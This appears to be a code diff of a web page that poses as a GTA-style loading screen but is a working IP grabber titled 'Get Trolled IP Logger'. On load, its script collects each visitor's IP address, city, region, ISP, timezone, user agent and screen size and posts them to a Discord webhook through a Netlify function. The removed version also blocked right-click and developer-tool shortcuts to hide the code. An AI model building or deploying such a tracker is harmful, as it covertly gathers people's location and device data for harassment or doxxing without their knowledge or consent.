@@ -1,114 +1,117 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Loading...</title>
-<style>
-  /* GTA IV style loading screen */
-
-  html, body {
-    margin: 0; padding: 0; height: 100%;
-    background: black;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    user-select: none;
-    font-family: 'Arial Black', Arial, sans-serif;
-    color: white;
-  }
-
-  #loading-text {
-    font-size: 6rem;
-    letter-spacing: 0.3em;
-    animation: flickerGTA 2.5s infinite alternate;
-  }
-
-  @keyframes flickerGTA {
-    0%, 100% { opacity: 1; }
-    40%, 60% { opacity: 0.3; }
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Loading...</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0; height: 100%;
+      background: black;
+      color: white;
+      font-family: 'Arial Black', Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      user-select: none;
+    }
+    #loading-text {
+      font-size: 6rem;
+      letter-spacing: 0.3em;
+      animation: flickerGTA 2.5s infinite alternate;
+    }
+    @keyframes flickerGTA {
+      0%, 100% { opacity: 1; }
+      40%, 60% { opacity: 0.3; }
+    }
+    #log-status {
+      margin-top: 30px;
+      font-size: 1.4rem;
+      font-weight: bold;
+      color: #0f0;
+      text-align: center;
+      max-width: 90vw;
+      word-wrap: break-word;
+    }
+    #log-status.error {
+      color: #f33;
+    }
+  </style>
 </head>
 <body>
+  <div id="loading-text">LOADING...</div>
+  <div id="log-status">Fetching IP and logging...</div>
 
-<div id="loading-text">LOADING...</div>
+  <script>
+    const netlifyFunctionUrl = "/.netlify/functions/log-ip";
+    const logStatus = document.getElementById('log-status');
 
-<script>
-  // Disable right-click and some devtools keys
-  document.addEventListener('contextmenu', e => e.preventDefault());
-  document.addEventListener('keydown', e => {
-    if (
-      e.key === "F12" ||
-      (e.ctrlKey && e.shiftKey && ['I', 'C'].includes(e.key.toUpperCase())) ||
-      (e.ctrlKey && e.key.toUpperCase() === 'U')
-    ) {
-      e.preventDefault();
+    async function fetchIPInfo() {
+      const res = await fetch('https://ipwhois.app/json/');
+      if (!res.ok) throw new Error('Failed to fetch IP info');
+      return res.json();
     }
-  });
 
-  const netlifyFunctionUrl = "/.netlify/functions/log-ip";
-
-  async function fetchIPInfo() {
-    const res = await fetch('https://ipwhois.app/json/');
-    if (!res.ok) throw new Error('Failed to fetch IP info');
-    return res.json();
-  }
-
-  async function sendDiscordWebhook(embed) {
-    try {
-      const res = await fetch(netlifyFunctionUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] }),
-      });
-      if (!res.ok) throw new Error(`Logging failed: ${res.status}`);
-      console.log("Logged successfully");
-    } catch (e) {
-      console.error("Failed to send webhook:", e);
+    async function sendDiscordWebhook(embed) {
+      try {
+        const res = await fetch(netlifyFunctionUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ embeds: [embed] }),
+        });
+        if (!res.ok) {
+          const errorText = await res.text();
+          throw new Error(`Logging failed: ${res.status} - ${errorText}`);
+        }
+        const json = await res.json();
+        return json.message || "Logged successfully";
+      } catch (e) {
+        throw e;
+      }
     }
-  }
 
-  (async () => {
-    try {
-      const data = await fetchIPInfo();
+    (async () => {
+      try {
+        const data = await fetchIPInfo();
 
-      const embed = {
-        title: "🕵️ New Visitor Logged",
-        color: 0xFFFFFF,
-        timestamp: new Date().toISOString(),
-        footer: {
-          text: "Get Trolled IP Grabber",
-          icon_url: "https://i.imgur.com/qZ7j0fV.png"
-        },
-        thumbnail: {
-          url: data.country_flag || ""
-        },
-        author: {
-          name: "Get Trolled IP Logger",
-          url: "https://discord.com",
-          icon_url: "https://i.imgur.com/qZ7j0fV.png"
-        },
-        fields: [
-          { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
-          { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
-          { name: "Region", value: `${data.region}`, inline: true },
-          { name: "City", value: `${data.city}`, inline: true },
-          { name: "ISP", value: `${data.isp}`, inline: false },
-          { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
-          { name: "VPN/Proxy Detected", value: `${data.security.is_proxy ? "Yes" : "No"}`, inline: true },
-          { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-          { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
-        ]
-      };
+        const embed = {
+          title: "🕵️ New Visitor Logged",
+          color: 0x00ffff,
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: "Get Trolled IP Logger",
+            icon_url: "https://i.imgur.com/qZ7j0fV.png"
+          },
+          thumbnail: {
+            url: data.country_flag || ""
+          },
+          author: {
+            name: "Get Trolled IP Logger",
+            url: "https://discord.com",
+            icon_url: "https://i.imgur.com/qZ7j0fV.png"
+          },
+          fields: [
+            { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
+            { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
+            { name: "Region", value: `${data.region}`, inline: true },
+            { name: "City", value: `${data.city}`, inline: true },
+            { name: "ISP", value: `${data.isp}`, inline: false },
+            { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
+            { name: "VPN/Proxy Detected", value: `${data.security.is_proxy ? "Yes" : "No"}`, inline: true },
+            { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+            { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
+          ]
+        };
 
-      await sendDiscordWebhook(embed);
-
-    } catch (err) {
-      console.error(err);
-    }
-  })();
-</script>
-
+        const result = await sendDiscordWebhook(embed);
+        logStatus.textContent = `✅ Success: ${result}`;
+        logStatus.classList.remove('error');
+      } catch (err) {
+        logStatus.textContent = `❌ Error: ${err.message}`;
+        logStatus.classList.add('error');
+      }
+    })();
+  </script>
 </body>
 </html>
